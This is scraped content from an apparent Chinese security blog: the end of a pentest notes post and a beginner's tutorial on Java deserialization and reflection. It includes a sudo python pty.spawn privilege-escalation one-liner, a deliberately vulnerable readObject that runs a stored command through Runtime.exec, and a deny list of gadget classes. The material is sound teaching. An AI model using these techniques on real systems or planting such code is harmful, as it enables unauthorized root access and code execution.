代表网络中的主机（具体的权限控制，根据初步阅读可以设置为机器组。这些可能包括主机名(可选择使用通配符)、IP地址、网络号码或网络组。）\nGroups of machines. These may include host names (optionally with wildcards) IP addresses, network numbers or netgroups.\n第二个 ALL 规定可以使用谁的身份去执行命令 （目前发现 如果是root的话就可以使用root权限执行命令 ）\n如果设置了 NOPASSWD 可以免密执行\n第三个 ALL 规定可以使用（指定身份）执行的命令\n如果是如下权限设置的话，就可以使用 python 一句话提权\nsudo python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)'\n其他配置后可以使用root权限的方式\n","date":"2023-06-25T00:00:00Z","permalink":"https://d4n-sec.github.io/p/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AA%E4%BA%BA%E7%BB%8F%E9%AA%8C/","title":"渗透测试个人经验"},{"content":"本章是 D4n的Java安全入门 第一篇，望大佬指正，小白避坑\n测试用Java版本（17.0.6）\nJava反序列化 什么是反序列化 ​\t借用一下大佬的描述：\nJava描述的是一个‘世界’，程序运行开始时，这个‘世界’也开始运作，但‘世界’中的对象不是一成不变的，它的属性会随着程序的运行而改变。 但很多情况下，我们需要保存某一刻某个对象的信息，来进行一些操作。比如利用反序列化将程序运行的对象状态以二进制形式储存与文件系统中，然后可以在另一个程序中对序列化后的对象状态数据进行反序列化恢复对象。可以有效地实现多平台之间的通信、对象持久化存储。\n序列化与反序列化是让Java对象脱离Java运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。\n​\t用自己的话说就是，如果需要传输一个对象（或是一段数据）给目标（途径可以是网络，进程间等任何可以传输数据的地方，目标可以是客户端，子进程，线程等）需要将对象的一些或者所有信息以一种格式传输给目标，比如常见的JSON、XML、YAML格式，就是将一些数据格式化为相应标准格式的例子\n​\t这种将数据格式标准化的过程就可以称之为序列化，而对应的，目标接收到这种格式化数据之后，将对象或者数据还原成原本或者需要的样子就称为反序列化。\n​\t在Java中想要序列化一个对象，需要同时满足两个条件：\n该类必须实现 java.io.Serializable 接口。 该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。 ​\t只有实现了Serializable或Externalizable接口的类的对象才能被序列化，否则抛出异常。 ​\t注：Externalizable 是继承了Serializable的抽象类\n​\t所以你想知道一个Java标准类是否是可序列化的，可以查看他的类描述，看是否实现了java.io.Serializable接口\n为什么要序列化 对象不只是存储在内存中，它还需要在传输网络中进行传输，并且保存起来之后下次再加载出来，这时候就需要序列化技术。\nJava的序列化技术就是把对象转换成一串由二进制字节组成的数组，然后将这二进制数据保存在磁盘或传输网络。而后需要用到这对象时，磁盘或者网络接收者可以通过反序列化得到此对象，达到对象持久化的目的。\n反序列化漏洞来源 开发失误\n开发人员并没有重写ObjectInputStream类的resolveClass方法，或者重写过但是过滤不严格就会导致反序列化漏洞 使用了不安全的基础库\n​\t很大比例的反序列化漏洞是因使用了不安全的基础库而产生的，一般优秀的Java开发人员会按照安全编程规范进行编程，并且一些成熟的Java框架 Spring MVC、Struts2等会有相应的防范机制，如果只是开发失误的话，能造成的反序列化漏洞很少 ​\t但使用不安全的基础库则不一样 ​ 2015年由黑客Gabriel Lawrence和Chris Frohoff发现的Apache Commons Collections类库直接影响了WebLogic、WebSphere、JBoss、Jenkins、OpenNMS等大型框架。直到今天该漏洞的影响仍未消散。 存在危险的基础库：\n1 2 3 4 5 6 7 8 9 10 11 12 commons-fileupload 1.3.1 commons-io 2.4 commons-collections 3.1 commons-logging 1.2 commons-beanutils 1.9.2 org.slf4j:slf4j-api 1.7.21 com.mchange:mchange-commons-java 0.2.11 org.apache.commons:commons-collections 4.0 com.mchange:c3p0 0.9.5.2 org.beanshell:bsh 2.0b5 org.codehaus.groovy:groovy 2.3.9 org.springframework:spring-aop 4.1.4.RELEASE 某反序列化防护软件便是通过禁用以下类的反序列化来保护程序：\n1 2 3 4 5 6 7 8 \u0026#39;org.apache.commons.collections.functors.InvokerTransformer\u0026#39;, \u0026#39;org.apache.commons.collections.functors.InstantiateTransformer\u0026#39;, \u0026#39;org.apache.commons.collections4.functors.InvokerTransformer\u0026#39;, \u0026#39;org.apache.commons.collections4.functors.InstantiateTransformer\u0026#39;, \u0026#39;org.codehaus.groovy.runtime.ConvertedClosure\u0026#39;, \u0026#39;org.codehaus.groovy.runtime.MethodClosure\u0026#39;, \u0026#39;org.springframework.beans.factory.ObjectFactory\u0026#39;, \u0026#39;xalan.internal.xsltc.trax.TemplatesImpl\u0026#39; ​\t基础库中的调用流程一般都比较复杂，不会如同接下来给出的测试用例一般简单，涉及到POP链，反射，泛型等知识\n如何序列化与反序列化 JDK类库提供的序列化API java.io.ObjectOutputStream：表示对象输出流 它的writeObject(Object obj)方法可以对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。 java.io.ObjectInputStream：表示对象输入流 它的readObject()方法从源输入流中读取字节序列，再把它们反序列化成为一个对象，并将其返回。 Java对象序列化与反序列化的调用流程 方法一：\n若Student类仅仅实现了Serializable接口，则可以按照以下方式进行序列化和反序列化。 ObjectOutputStream采用默认的序列化方式，对Student对象的非transient的实例变量进行序列化。 ObjcetInputStream采用默认的反序列化方式，对对Student对象的非transient的实例变量进行反序列化。\n方法二：\n若Student类仅仅实现了Serializable接口，并且还定义了readObject(ObjectInputStream in)和writeObject(ObjectOutputSteam out)， ObjectOutputStream调用Student对象的writeObject(ObjectOutputStream out)的方法进行序列化。 ObjectInputStream会调用Student对象的readObject(ObjectInputStream in)的方法进行反序列化。\n方法三：\n若Student类实现了Externalnalizable接口，且Student类必须实现readExternal(ObjectInput in)和writeExternal(ObjectOutput out)方法，则按照以下方式进行序列化与反序列化。 ObjectOutputStream调用Student对象的writeExternal(ObjectOutput out))的方法进行序列化。 ObjectInputStream会调用Student对象的readExternal(ObjectInput in)的方法进行反序列化。\n尝试序列化 先写一个待反序列化的类：\n1 2 3 4 5 6 7 8 9 public class Employee implements java.io.Serializable { public String name; public String identify; public void mailCheck() { System.out.println(\u0026#34;This is the \u0026#34;+this.identify+\u0026#34; of our company\u0026#34;); } } 然后再写一个序列化和反序列化测试类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import java.io.FileOutputStream; import java.io.IOException; import java.io.ObjectOutputStream; public class SerializeDemo { public static void main(String [] args) { Employee e = new Employee(); e.name = \u0026#34;my name\u0026#34;; e.identify = \u0026#34;General staff\u0026#34;; try { // 打开一个文件输入流 FileOutputStream fileOut = new FileOutputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); // 建立对象输入流 ObjectOutputStream out = new ObjectOutputStream(fileOut); //输出反序列化对象 out.writeObject(e); out.close(); fileOut.close(); System.out.printf(\u0026#34;Serialized data is saved in C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); }catch(IOException i) { i.printStackTrace(); } } } 运行后，Employee对象的序列化数据就存储到了Serialize.txt中，我们打开看一下（使用二进制查看器）\n可以依稀看见：类名，属性名称，属性类型，以及属性对应的值 值得注意的是：大部分的反序列化数据均是以AC ED 00 05 开头的\n反序列化操作就是从字节流中提取对象：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import java.io.*; public class SerializeDemo2 { public static void main(String [] args) { Employee e = null; try { // 打开一个文件输入流 FileInputStream fileIn = new FileInputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); // 建立对象输入流 ObjectInputStream in = new ObjectInputStream(fileIn); // 读取对象 e = (Employee) in.readObject(); in.close(); fileIn.close(); }catch(IOException i) { i.printStackTrace(); return; }catch(ClassNotFoundException c) { System.out.println(\u0026#34;Employee class not found\u0026#34;); c.printStackTrace(); return; } System.out.println(\u0026#34;Deserialized Employee...\u0026#34;); System.out.println(\u0026#34;Name: \u0026#34; + e.name); System.out.println(\u0026#34;This is the \u0026#34;+e.identify+\u0026#34; of our company\u0026#34;); } } 运行后可以发现Employee的数据已经获取到了目标程序中对象e里\n上诉就是一个完整的序列化周期，中间使用文件暂时作为了传输介质，其实实际应用中的序列化无非就是传输的方式和传输机制稍微复杂一点\n总结序列化具体步骤 从上面的可以看出对象的序列化步骤是：\n创建一个对象输出流，它可以包装一个其它类型的目标输出流，如文件输出流： ObjectOutputStream out = new ObjectOutputStream(new fileOutputStream(“D:\\\\objectfile.obj”));\n通过对象输出流的writeObject()方法写对象：\n1 2 out.writeObject(“Hello”); out.writeObject(new Date()); 对象的反序列化步骤是：\n创建一个对象输入流，它可以包装一个其它类型输入流，如文件输入流： ObjectInputStream in = new ObjectInputStream(new fileInputStream(“D:\\\\objectfile.obj”));\n通过对象输出流的writeObject()方法写对象：\n1 2 String obj1 = (String)in.readObject(); Date obj2 = (Date)in.readObject(); 序列化与反序列化的必要条件 必须是同包，同名。 serialVersionUID必须一致。有时候两个类的属性稍微不一致的时候，可以通过将此属性写死值，实现序列化和反序列化。 序列化中涉及细节 serialVersionUID 版本控制 ​\tJava的序列化机制是通过在运行时判断类的 serialVersionUID 来验证版本一致性的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体（类）的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常。\n​\t虚拟机是否允许反序列化，不仅取决于类路径和功能代码是否一致，一个非常重要的一点是两个类的序列化 ID 是否一致，代码中设置 serialVersionUID 可以在类中添加 private static final long serialVersionUID = 1L\n​\t当实现java.io.Serializable接口的实体（类）没有显式地定义一个名为serialVersionUID，类型为long的变量时，Java序列化机制会根据编译的class自动生成一个serialVersionUID作序列化版本比较用，这种情况下，只有同一次编译生成的class才会生成相同的serialVersionUID\n​\t如果我们不希望通过编译来强制划分软件版本，即实现序列化接口的实体能够兼容先前版本，未作更改的类，就需要显式地定义一个名为serialVersionUID，类型为long的变量，不修改这个变量值的序列化实体都可以相互进行串行化和反串行化。\n常见场景 问题出现场景：两个客户端 A 和 B 试图通过网络传递对象数据，A 端将对象 C 序列化为二进制数据再传给 B，B 反序列化得到 C。 问题：C 对象的全类路径假设为 com.inout.Test，在 A 和 B 端都有这么一个类文件，功能代码完全一致。也都实现了 Serializable 接口，但是反序列化时总是提示不成功。 解决：统一serialVersionUID的值\n虽然两个类的功能代码完全一致，但是序列化 ID 不同，他们无法相互序列化和反序列化。\nserialVersionUID 使用场景 序列化存储规则 将同一对象序列化并两次写入同一文件时 Java 序列化机制为了节省磁盘空间，具有特定的存储规则，当写入文件的为同一对象时，并不会再将对象的内容进行存储，而只是再次存储一份引用，文件只会增加小小的几个字节，这几个字节的存储空间就是新增引用和一些控制信息的空间。反序列化时，恢复引用关系，使得反序列化的 e1 和 e2 指向唯一的对象，二者相等，为引用关系，该存储规则极大的节省了存储空间。\n将对象序列化后写入文件，修改对象参数值后再次序列化后写入同一文件时 第一次写入对象以后，第二次再试图写的时候，虚拟机根据引用关系知道已经有一个相同对象已经写入文件，因此只保存第二次写的引用，所以读取时，都是第一次保存的对象。读者在使用一个文件多次 writeObject 需要特别注意这个问题。\n更多细节 关于 静态变量序列化 ，父类的序列化与 Transient 关键字，对敏感字段加密，移步链接3\n初识反序列化漏洞 Java反序列化时，会调用readObject方法就行反序列化操作，当readObject方法书写不当时就会引发漏洞\n有时也会使用readUnshared()方法来读取对象，readUnshared()不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以\n大佬给的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 import java.io.*; public class test0{ public static void main(String args[]) throws Exception{ UnsafeClass0 Unsafe = new UnsafeClass0(); Unsafe.name = \u0026#34;hacked by ph0rse\u0026#34;; FileOutputStream fos = new FileOutputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()方法将Unsafe对象写入object文件 os.writeObject(Unsafe); os.close(); //从文件中反序列化obj对象 FileInputStream fis = new FileInputStream(\u0026#34;C:\\\\Users\\\\DAN\\\\Desktop\\\\Serialize.txt\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); //恢复对象 UnsafeClass0 objectFromDisk = (UnsafeClass0)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); } } class UnsafeClass0 implements Serializable{ public String name; //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ //执行默认的readObject()方法 in.defaultReadObject(); //执行命令 Runtime.getRuntime().exec(\u0026#34;calc.exe\u0026#34;); } } 能够成功执行到Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;);\n对反序列化的疑问与分析 关于大佬的代码我有几个疑问：\nRuntime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;); 只能够控制弹出一个计算器，我能不能使用一个字符串变量代替（PHP反序列化的经验告诉我应该是可行的），进而轻松改变将要执行的命令？\nUnsafeClass0 的 readObject 是何时被执行的，是被谁调用的（因为当我查看下图readObject执行时的源码时 跳转的是ObjectInputStream类的readObject 那么是什么时候调用的UnsafeClass0的readObject呢？（强转类型的时候吗？）\n第一个问题 关于第一个问题，只需要将断点打到Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;);，然后观察变量就不难看出可以使用this.command打到我想要的效果，所以修改代码为\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import java.io.*; public class test0{ public static void main(String args[]) throws Exception{ ---- Unsafe.name = \u0026#34;hacked by D4n\u0026#34;; Unsafe.command = \u0026#34;notepad\u0026#34;;//增加 ---- } } class UnsafeClass0 implements Serializable{ --- public String command; //增加 //重写readObject()方法 private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException{ --- Runtime.getRuntime().exec(this.command); //修改 } } 此时只需要控制 Unsafe 对象的 command 属性值即可执行不同命令\n但是在分析第一个问题的时候，刚进入 UnsafeClass0的readObject()方法的时候，this还没有被赋值\n再步过in.defaultReadObject();的时候，this 的变量值就被赋值成了我们设置的样子： 所以我想跟进一下，关于this变量是什么时候怎么样被赋值的，所以应该着重分析in.defaultReadObject();干了哪些事，并且在此之前，其他相关反序列化代码做的事只是创建好对象，开辟好空间，没有赋值操作（猜测）\n新问题：关于this变量是什么时候怎么样被赋值的（序列化字符串是怎么一步一步变成对象的）\n让我们进入in.defaultReadObject();看看 没法直接步入，所以要先 ctrl + B 进入源码后再打断点 贴个源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public void defaultReadObject() throws IOException, ClassNotFoundException { SerialCallbackContext ctx = curContext; if (ctx == null) { throw new NotActiveException(\u0026#34;not in call to readObject\u0026#34;); } Object curObj = ctx.getObj(); ObjectStreamClass curDesc = ctx.getDesc(); bin.setBlockDataMode(false); // Read fields of the current descriptor into a new FieldValues FieldValues values = new FieldValues(curDesc, true); if (curObj != null) { values.defaultCheckFieldValues(curObj); values.defaultSetFieldValues(curObj); } bin.setBlockDataMode(true); if (!curDesc.hasWriteObjectData()) { /* * Fix for 4360508: since stream does not contain terminating * TC_ENDBLOCKDATA tag, set flag so that reading code elsewhere * knows to simulate end-of-custom-data behavior. */ defaultDataEnd = true; } ClassNotFoundException ex = handles.lookupException(passHandle); if (ex != null) { throw ex; } } 其中第一句赋值完成后就可以看到 ctx中已经存放好了 UnsafeClass0 类的未初始化对象（实际从地址来看就是在in.defaultReadObject();调用时的\u0026quot;this变量\u0026quot;，为了方便称呼，我称之为UnsafeClass0--this\nSerialCallbackContext类理解\n之后\nObject curObj = ctx.getObj();将this地址值赋值给 curObj，即 curObj 是UnsafeClass0--this的引用\nObjectStreamClass curDesc = ctx.getDesc();将对象流赋值给 curDesc 查看 curDesc 发现\n猜测这里存放的是对象属性以及对应值，粗略查看没有找到具体数据，过\nbin.setBlockDataMode(false); BlockDataInputStream 这句的粗略理解就是一个流程控制，暂时无关我需要分析的问题，过 问题1-2：关于this变量是什么时候怎么样被赋值的\nFieldValues values = new FieldValues(curDesc, true); 这句执行之后 curObj暂时没有发生变化\n所以先不去查看FieldValues在做什么事情，根据构造的传参猜测大致是对 类描述进行处理\n接下来进入 if判断\n（ curObj 不为空 ）\n执行完values.defaultSetFieldValues(curObj);之后，curObj的值就被设置好了，果然使用到了 FieldValues类的对象values，跟进一下values.defaultSetFieldValues(curObj);\ndefaultSetFieldValues()第一个IF判断false，第二个判断Ture，将要修改的对象Obj 传入desc.setObjFieldValues(obj, objValues);，跟进前看看objValues是个什么东西\n发现值已经被设置好了，那setObjFieldValues()做的可能只是复制objValues里的值给Obj，此时UnsafeClass0--this就已经改变了\n新问题：objValues 是什么时候赋值的呢\n跟进看一下\n这里就是在往objValues里写东西了，看看readObject0如何解析的（f.isUnshared()返回一个布尔值）\n经历一系列类似流程控制的东西，最后来到了这\n先看看 readString 在干嘛：\n先完整执行一遍，发现路过那条switch语句的时候，str就能被赋值为序列化字符串里的关键字\n说明readUTF是在从序列化字符串中提取数据，看看 bin 是个什么东西\nbin里是已经处理好的序列化字符串碎片，那么是哪个函数在处理整个序列化字符串呢？（找到给bin赋值的语句）\n直接看看不出什么端倪，看来只有跟着断点走一次\n走一次，没有找到给bin.cbuf赋值的地方，但是有意外收获：\n这不就是妥妥的咱要找的东西吗，sigs的来源找到了，怎么赋值给bin.cbuf就暂时不深究了（毕竟其实很想看到的就是如何从序列化中提取出之前写入的序列化数据）\n这里的代码是这样的：\n查看一下这个sigs能在哪些地方被赋值\n看来就只有sigs[j++] = f.getName();sigs[j++] = f.getSignature();这两个地方，康康f.getName()和f.getSignature()在干嘛\n，，，，他没干嘛，所以看看 f 怎么来的 （可恶，对 get set 类函数还是不够敏感，但是也算严谨，，，，）\nObjectStreamField f = fields[i];，所以得看看fields是怎么来的 Field类说明\n这里的fields是直接传参进来的，而且这里是FieldReflectorKey类的构造函数，康康谁在new呢？\n这里的fields哪来的？\n这里的fields也是传参，再跟！\n这里发现给fields赋值的地方有些多，重新debug看看\n多次尝试，发现赋值的地方在：\n再路过就已经处理好啦，跟进：\n这步赋值，跟进：\n这步又是已经被处理好了（怎么这么多检测）重新在Field[] clFields = cl.getDeclaredFields();处打个断点，重新看看\n又是被处理好的，重新跟踪rd\n又，调用的时候已经有了，，，经过反复调试，终于找到一个像是最初处理的函数\n但是已经没有办法追踪了，getDeclaredFields0(publicOnly)粗略理解：\n​\tgetDeclaredFields0() 是 Java 中 Class 类的一个本地方法，实际上是使用 C 或 C++ 等本地语言编写的。本地方法是 Java 中与底层操作系统和硬件交互的一种机制，可以让 Java 程序能够调用底层操作系统提供的本地功能和资源。 ​\tJava 语言本身并不支持底层操作系统和硬件的访问，因此需要使用本地方法来扩展 Java 的能力。本地方法通常由本地库（native library）实现，本地库是一个动态链接库（.dll 或 .so 文件），其中包含了本地方法的实现。在 Java 中，可以使用 System.loadLibrary() 或 System.load() 方法来加载本地库，从而使 Java 程序能够调用本地方法。 ​\t在 Class 类中，getDeclaredFields0() 方法是使用本地语言编写的本地方法，它实现了获取一个类中声明的所有成员变量的功能。当 Java 程序调用 getDeclaredFields() 方法时，实际上是调用了 getDeclaredFields0() 方法的 Java 封装，而这个封装方法会通过 JNI（Java Native Interface）机制来调用本地方法的实现。\n但是getDeclaredFields0(publicOnly)只是获得了类里声明的成员变量，并没有给其赋值，具体的值是什么时候抽取出来的？\n重新调整思路，一路debug寻找，找到了readUTFBody：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 private String readUTFBody(long utflen) throws IOException { StringBuilder sbuf; if (utflen \u0026gt; 0 \u0026amp;\u0026amp; utflen \u0026lt; Integer.MAX_VALUE) { // a reasonable initial capacity based on the UTF length int initialCapacity = Math.min((int)utflen, 0xFFFF); sbuf = new StringBuilder(initialCapacity); } else { sbuf = new StringBuilder(); } if (!blkmode) { end = pos = 0; } while (utflen \u0026gt; 0) { int avail = end - pos; if (avail \u0026gt;= 3 || (long) avail == utflen) { utflen -= readUTFSpan(sbuf, utflen); } else { if (blkmode) { // near block boundary, read one byte at a time utflen -= readUTFChar(sbuf, utflen); } else { // shift and refill buffer manually if (avail \u0026gt; 0) { System.arraycopy(buf, pos, buf, 0, avail); } pos = 0; end = (int) Math.min(MAX_BLOCK_SIZE, utflen); in.readFully(buf, avail, end - avail); } } } return sbuf.toString(); } 粗略理解一下：\nreadUTFBody，它的作用是从输入流中读取指定长度的UTF-8字符串，并将其转换为Java的String类型返回。\n具体来说，代码的主要逻辑如下：\n根据指定的 utflen（表示UTF-8编码的字节数）创建一个 StringBuilder 对象 sbuf，作为存储解码后字符串的缓冲区。如果 utflen 在 0 和 Integer.MAX_VALUE 之间，则设置 sbuf 的初始容量为 utflen 和 0xFFFF 之间的较小值，以提高性能。\n如果当前输入流不处于块模式，则将输入流的 pos 和 end 分别设置为0，表示当前没有读取任何数据。\n进入一个while循环，循环条件是utflen大于0，即还需要继续读取字符串。\n在每次循环中，根据输入流的 pos 和 end 计算当前可用的字节数 avail。如果 avail 大于等于3，或者与 utflen 相等，则调用 readUTFSpan() 方法读取一段连续的字节，并将其解码成字符串，将解码后的字符串追加到 sbuf 中，并将已经读取的字节数从 utflen 中减去。\n如果avail小于3且不等于 utflen ，则分两种情况处理：\n如果当前输入流处于块模式，则说明接近块边界，便逐个字节地读取剩余字节，调用readUTFChar函数读取一个字符，将解码后的字符追加到 sbuf 中，并将已经读取的字节数从 utflen 中减去。 如果当前输入流不处于块模式，则手动移动剩余字节到缓冲区的开头，重新填充缓冲区，将 pos 和 end 分别设置为0和新的可读取字节数，然后继续循环读取数据。 在while循环结束后，返回 sbuf 缓冲区中存储的解码后的字符串，即读取的UTF-8字符串。\n需要注意的是，在读取字节和解码字符串的过程中，如果遇到任何错误（如读取字节失败、解码失败等），则会抛出 IOException 或UTFDataFormatException 异常。\n简单来说就是把字节流转换成字符串的函数，字节流是从buff变量里面读取的，buff是什么时候赋值的呢 in.readFully()\n所以完整序列化数据到对象的过程：\nin.readFully()读入指定位置和字数的字节到buff，readUTFBody()和readUTFSpan()控制buff字节流的同时读出里面的属性名与其对应属性，返回到ObjectStreamClass里组装到fields里，然后返回值一路返回到ObjectInputStream类里，这之前都是为了生成对类的细节描述“des”：类名，属性名，属性类型，做好了对象的框架后最后再ObjectStreamClass里对类进行了实例化\n调用的也是反射类的实例函数：\n最后在ObjectInputStream里obj接收到了返回的实例化好的空的UnsafeClass0对象\n此时再次调试发现回到了我们定义的类里面\n所以可以确定了，在执行UnsafeClass0.readObject中的in.defaultReadObject();之前，都只是在初始化一个UnsafeClass0类的实例化对象，此时再进入defaultReadObject进行值的赋\ndefultReadObject做的是就是拿到当前需要赋值的ObjcurObj和当前处理好的对该Obj的描述curDesc然后在创建FieldValuse对象初始化\n这次初始化也是通过调用\nreadUTF等一系列方法对序列化字节进行处理得到具体值\n通过curDesc拿到该赋的具体值给curObj赋值，即可完成反序列化\n第二个问题 UnsafeClass0 的 readObject 是有参数的，所以UnsafeClass0 objectFromDisk = (UnsafeClass0)ois.readObject();肯定不是直接调用 UnsafeClass0 中的 readObject，那是谁调用的呢？可以通过函数栈观察\n调用情况使用 =\u0026gt; 表示\nmain =\u0026gt; ObjectInputStream.readObject =\u0026gt; ObjectInputStream.readObject0 =\u0026gt; ObjectInputStream.readOrdinaryObject =\u0026gt; ObjectInputStream.readSerialData =\u0026gt; ObjectStreamClass.invokeReadObject =\u0026gt; Method.invoke =\u0026gt; 然后一堆看不懂的 =\u0026gt; UnsafeClass0.readObject\n看到熟悉的 Method.invoke了吗，（好吧其实也不是很熟）Java也是通过反射来调用 UnsafeClass0.readObject\n至此，反序列化的初步理解就告一段落了\nPOP链 ​\tPOP（Property-Oriented Programming）直译的话就是面向属性编程，如果学过二进制的话就可以类比一下ROP。 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。\n​\t作者个人理解：从可控的输入点到最终的代码执行点一般不是直达的，此时需要精心构造或者寻找一些能够在不同对象，方法之间跳转的跳板函数或者跳板对象。且这些跳板本身可能并不是用作跳板用途，有时候的跳板可能只是利用了相关函数的设计机制（例如PHP中访问一个对象不存在的方法时会被调用该对象的__class__魔术方法）\n​\t在之后的文章中，会深刻的领悟到POP的精髓\n反射 要知道什么是反射，首先就要知道\u0026quot;正射\u0026quot;是怎么样的\n一般情况下，我们使用某个类前，我们是知道这个类的类名的，比如实例化对象的时候\n1 2 Apple apple = new Apple(); //直接初始化，「正射」 apple.setPrice(4); 类似这种知道要初始化类的类名，并将其写死在代码中，运行时无法更改的，就可以称之为正射\n反射的话就是和正射反着来，程序运行起来之前，我并不知道我需要初始化类的类名叫什么，所以我无法在代码中写死\n举一个不恰当但是很合适的需求：我需要使用Java写一个程序，在其运行期间，我每输入一个类的名字，Java程序就帮我实例化好这个类对象，将其序列化成字节流，并创建写入一个文件，路径和我的工作路径相同，文件名就是我输入的类的名字，其中对象的整形属性按照变量名的字母数赋值，其他类型的属性赋值为 Null\n如果没有在其运行期间这个前提条件的话，实现这个需求我们可以手动 new 出对象来，然后数出变量名字母数，然后序列化好放入文件中\n​\t反射是Java的特征之一，是一种间接操作目标对象的机制，核心是JVM在运行状态的时候才动态加载类，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法/访问属性。这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。\n但是在运行期间的话，只能使用到反射了（举例到此为止，接下来的代码不解决上诉需求）\n我们可以使用 JDK 提供的反射 API 进行反射调用\n1 2 3 4 5 Class clz = Class.forName(\u0026#34;com.dan.Apple\u0026#34;); Method method = clz.getMethod(\u0026#34;setPrice\u0026#34;, int.class); Constructor constructor = clz.getConstructor(); Object object = constructor.newInstance(); method.invoke(object, 4); 这两段代码的能实现相同的作用，但是第二段代码获取类实例化对象时，类名是通过字符串获取的\n反射就是在运行时才知道要操作的类是什么，并且可以在运行时获取类的完整构造，并调用对应的方法。\n接下来先看看使用反射我们能简单干些什么，怎么使用反射\n获取Class对象 在反射中，要获取一个类或调用一个类的方法，我们首先需要获取到该类的 Class 对象。\n有三种方法\n第一种，使用 Class.forName 静态方法。当你知道该类的全路径名时，你可以使用该方法获取 Class 类对象。\nClass clz = Class.forName(\u0026quot;java.lang.String\u0026quot;);\n第二种，使用 .class 方法。\n这种方法只适合在编译前就知道操作的 Class 名\nClass clz = String.class;\n第三种，使用类对象的 getClass() 方法\nString str = new String(\u0026quot;Hello\u0026quot;); Class clz = str.getClass();\n这三种获取CLass类方式中，我们一般使用第一种通过Class.forName方法去动态加载类。且使用 forName 就不需要import导入其他类，可以加载我们任意的类。 使用第二种类.class属性，需要导入类的包，依赖性太强，在大型项目中容易抛出编译错误； 使用第三种实例化对象的getClass()方法，需要本身创建一个对象，本身就没有了使用反射机制意义。 所以我们在获取class对象中，一般使用第一种Class.forName方法去获取。\n获取成员变量Field 获取成员变量Field位于java.lang.reflect.Field包中\nField[] getFields() ：获取所有public修饰的成员变量\nField[] getDeclaredFields() 获取所有的成员变量，不考虑修饰符\nField getField(String name) 获取指定名称的 public修饰的成员变量\nField getDeclaredField(String name) 获取指定的成员变量\n用一个例子理解：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import java.lang.reflect.Field; public class FieldTest { public String name; public String profession; protected int age; private String number; char sex; public static void main(String[] args){ try{ Class c1 = Class.forName(\u0026#34;com.dan.FieldTest\u0026#34;); // 创建Class对象 Field[] fieldArray1 = c1.getDeclaredFields(); //获取全部成员变量 Field[] fieldArray2 = c1.getFields();// 获取全部public成员变量 for (Field field : fieldArray1){ System.out.println(field.getName()); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); for (Field field : fieldArray2){ System.out.println(field.getName()); } System.out.println(\u0026#34;-------分割线---------\u0026#34;); Field fieldArray3 = c1.getField(\u0026#34;name\u0026#34;); // 获取指定名称的public修饰的成员变量 System.out.println(fieldArray3.getName()); System.out.println(\u0026#34;-------分割线---------\u0026#34;); Field fieldArray4 = c1.getDeclaredField(\u0026#34;number\u0026#34;); // 获取指定的成员变量 System.out.println(fieldArray4.getName()); } catch (Exception e) { e.printStackTrace(); } } } 获取成员方法Method Method getMethod(String name, 类\u003c?\u003e\u0026hellip; parameterTypes) //返回该类所声明的public方法\nMethod getDeclaredMethod(String name, 类\u003c?\u003e\u0026hellip; parameterTypes) //返回该类所声明的所有方法\n//第一个参数获取该方法的名字，第二个参数获取标识该方法的参数类型\nMethod[] getMethods() //获取所有的public方法，包括类自身声明的public方法，父类中的public方法、实现的接口方法\nMethod[] getDeclaredMethods() // 获取该类中的所有方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 import java.lang.reflect.Method; public class MethodTest { public void study(String s) { System.out.println(\u0026#34;学习中...\u0026#34; + s); } protected void run() { System.out.println(\u0026#34;跑步中...\u0026#34;); } void eat() { System.out.println(\u0026#34;吃饭中...\u0026#34;); } private String sleep(int age) { System.out.println(\u0026#34;睡眠中...\u0026#34; + age); return \u0026#34;sleep\u0026#34;; } public static void 